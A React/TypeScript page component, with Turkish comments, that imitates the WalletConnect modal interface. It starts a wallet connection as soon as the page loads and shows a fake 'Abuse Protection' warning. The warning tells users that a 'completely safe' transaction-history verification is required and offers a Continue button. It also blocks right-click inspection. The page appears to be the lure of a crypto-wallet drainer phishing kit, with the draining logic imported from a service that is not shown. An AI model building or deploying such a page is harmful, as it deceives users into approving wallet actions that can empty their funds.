// src/pages/WalletConnect.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react/no-unknown-property */

import React, { useEffect } from "react";
import "../styles/main.css";
import "../index.css"; // global CSS’ni içeri aktar

import { connectWallet } from "../services/connect";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      "w3m-modal": any;
      "w3m-header": any;
      "w3m-router": any;
      "w3m-warning-view": any;
      "w3m-snackbar": any;
      "w3m-alertbar": any;
      "wui-flex": any;
      "wui-icon-link": any;
      "wui-icon": any;
      "wui-text": any;
      "wui-shimmer": any;
      "wui-button": any;
    }
  }
}

export default function WalletConnectPage() {
  useEffect(() => {
    // Sayfa açılır açılmaz cüzdan bağlama isteği gönder
    connectWallet().catch((err: any) => {
      console.error("Cüzdan bağlanamadı:", err);
    });
  }, []);

  return (
    <main className="wallet-connect-page">
      {/* gölge DOM root */}
      <div id="_b" />

      {/* modal */}
      <w3m-modal
        className="embedded open"
        style={{ "--w3m-modal-width": "430px" } as React.CSSProperties}
      >
        {/* header */}
        <w3m-header className="embedded" style={{ padding: 0, margin: 0 }}>
          <wui-flex
            justifycontent="space-between"
            alignitems="center"
            style={{
              alignItems: "center",
              justifyContent: "space-between",
              padding: "2px var(--wui-spacing-2l)",
              margin: 0,
            }}
          >
            {/* sol üst ünlem ikonu */}
            <div
              style={{
                padding: 0,
                margin: 0,
                background: "transparent",
                display: "flex",
                justifyContent: "flex-start",
              }}
              onContextMenu={(e) => e.preventDefault()}
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="34"
                viewBox="0 0 24 24"
                fill="none"
                stroke="var(--wui-color-fg-100)"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
                style={{
                  marginTop: "20px",
                  marginLeft: "10px",
                  width: "var(--wui-icon-size-lg)",
                  height: "var(--wui-icon-size-lg)",
                  display: "block",
                }}
              >
                <circle cx="12" cy="12" r="10" />
                <path d="M12 16v-4" />
                <path d="M12 8h.01" />
              </svg>
            </div>

            {/* başlık */}
            <wui-flex
              className="w3m-header-title"
              alignitems="center"
              gap="xs"
              style={{
                alignItems: "center",
                gap: "var(--wui-spacing-xs)",
              }}
            >
              <wui-text
                color="fg-100"
                variant="large-600"
                style={{
                  "--local-align": "left",
                  "--local-color": "var(--wui-color-fg-100)",
                  fontWeight: 600,
                  fontSize: "20px",
                  marginTop: "20px",
                } as React.CSSProperties}
              >
                Warning
              </wui-text>
            </wui-flex>

            {/* sağ boşluk */}
            <div style={{ width: "44px" }} />
          </wui-flex>

          {/* altındaki ince çizgi */}
          <hr
            style={{
              margin: 0,
              marginTop: "10px",
              border: "none",
              borderBottom: "0.5px solid rgba(255,255,255,0.08)",
            }}
          />
        </w3m-header>

        {/* içerik */}
        <w3m-router
          className="embedded"
          style={{
            animation: "unset",
            display: "flex",
            flexDirection: "column",
            height: "100%",
          } as React.CSSProperties}
        >
          <div
            className="w3m-router-container"
            view-direction="prev"
            style={{
              display: "flex",
              flexDirection: "column",
              flex: 1,
            } as React.CSSProperties}
          >
            <w3m-warning-view
              style={{
                display: "flex",
                flexDirection: "column",
                flex: 1,
              } as React.CSSProperties}
            >
              <wui-flex
                style={{
                  display: "grid",
                  gridTemplateRows: "auto auto 1fr auto",
                  height: "100%",
                  gap: "var(--wui-spacing-xl)",
                  justifyItems: "center",
                } as React.CSSProperties}
              >
                {/* Video */}
                <div
                  className="video loaded"
                  onContextMenu={(e) => e.preventDefault()}
                  style={{
                    position: "relative",
                    marginTop: "18px",
                    width: 214.2,
                    height: 324,
                    overflow: "hidden",
                    borderRadius:
                      "clamp(0px,var(--wui-border-radius-m), 40px)",
                  } as React.CSSProperties}
                >
                  <img
                    src="/media/refund_anim2.apng"
                    alt="Animasyon"
                    onContextMenu={(e) => e.preventDefault()}
                    style={{
                      display: "block",
                      width: "214.2px",
                      height: "324px",
                      objectFit: "cover",
                    } as React.CSSProperties}
                  />
                  <wui-shimmer
                    width="238px"
                    height="360px"
                    style={{
                      width: "238px",
                      height: "360px",
                      borderRadius:
                        "clamp(0px,var(--wui-border-radius-m), 40px)",
                    } as React.CSSProperties}
                  />
                </div>

                {/* Note */}
                <div
                  className="note"
                  style={{ width: "100%", textAlign: "center" }}
                >
                  <wui-text
                    variant="paragraph-500"
                    color="fg-100"
                    align="center"
                    style={{
                      "--local-align": "center",
                      "--local-color": "#eaeaea",
                      fontWeight: 500,
                      fontSize: "0.95em",
                      display: "inline-block",
                      lineHeight: 1.4,
                      textTransform: "none",
                    } as React.CSSProperties}
                  >
                    <wui-icon
                      name="info"
                      size="sm"
                      style={{
                        "--local-width": "14px",
                        marginRight: "4px",
                        verticalAlign: "middle",
                      } as React.CSSProperties}
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="16"
                        height="16"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="var(--wui-color-accent-100)"
                        strokeWidth="2.2"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        style={{ display: "inline", verticalAlign: "middle" }}
                      >
                        <circle cx="12" cy="12" r="10" />
                        <path d="M12 16v-4" />
                        <path d="M12 8h.01" />
                      </svg>
                    </wui-icon>
                    <span
                      className="text-accent"
                      style={{
                        color: "var(--wui-color-accent-100)",
                        fontWeight: 600,
                        verticalAlign: "middle",
                        marginRight: "2px",
                        display: "inline",
                        fontSize: "0.95em",
                        textTransform: "none",
                      }}
                    >
                      Note:
                    </span>
                    This dApp uses Abuse Protection to prevent misuse of platform.
                    You'll need to complete a quick verification of your transaction
                    history. It's completely safe and only takes a few seconds.
                  </wui-text>
                </div>

                {/* Continue Button */}
                <wui-button
                  variant="accent"
                  fullwidth=""
                  style={{
                    "--local-width": "100%",
                    "--local-opacity-100": "1",
                    "--local-opacity-000": "0",
                    "--local-border-radius": "var(--wui-border-radius-m)",
                  } as React.CSSProperties}
                >
                  <button
                    data-variant="accent"
                    data-icon-left="false"
                    data-icon-right="false"
                    data-size="lg"
                  >
                    Continue
                  </button>
                </wui-button>
              </wui-flex>
            </w3m-warning-view>
          </div>
        </w3m-router>

        {/* placeholder’lar */}
        <w3m-snackbar />
        <w3m-alertbar />
      </w3m-modal>
    </main>
  );
}
